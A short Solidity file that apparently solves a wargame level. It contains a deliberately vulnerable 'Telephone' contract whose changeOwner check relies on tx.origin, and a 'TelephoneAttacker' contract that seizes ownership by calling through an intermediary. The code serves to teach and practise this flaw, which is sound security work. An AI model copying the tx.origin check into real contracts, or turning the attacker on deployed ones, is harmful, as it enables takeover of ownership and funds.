// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttacker {
    Telephone private telephone;

    constructor(address _contractAddress) public {
        telephone = Telephone(_contractAddress);
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
